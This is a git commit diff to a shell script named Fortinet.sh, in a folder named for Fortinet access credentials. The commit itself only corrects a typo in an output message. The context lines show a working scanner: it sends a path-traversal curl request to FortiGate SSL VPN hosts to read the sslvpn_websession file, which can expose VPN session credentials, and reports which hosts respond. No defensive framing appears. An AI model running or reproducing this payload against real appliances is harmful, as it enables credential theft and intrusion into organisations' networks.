03332f2517843ce728713ddfd616f576b708c2cb
Jonathan-Elias <64284629+Jonathan-Elias@users.noreply.github.com>
2021-10-22 10:35:13 -0300

    Update Fortinet.sh

--- Credenciais_de_acesso_Fortinet/Fortinet.sh
+++ Credenciais_de_acesso_Fortinet/Fortinet.sh
@@ -4,6 +4,6 @@ do
 final=$(curl -s -H "User-Agent: mozilla/4.0" -o /dev/null -w "%{http_code}" -k https://$scan:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession)
 if [ $final == "200" ]
 then
-echo "VPN Vuneralver  =============>  https://$scan:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
+echo "VPN Vulneralver  =============>  https://$scan:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
 fi
 done
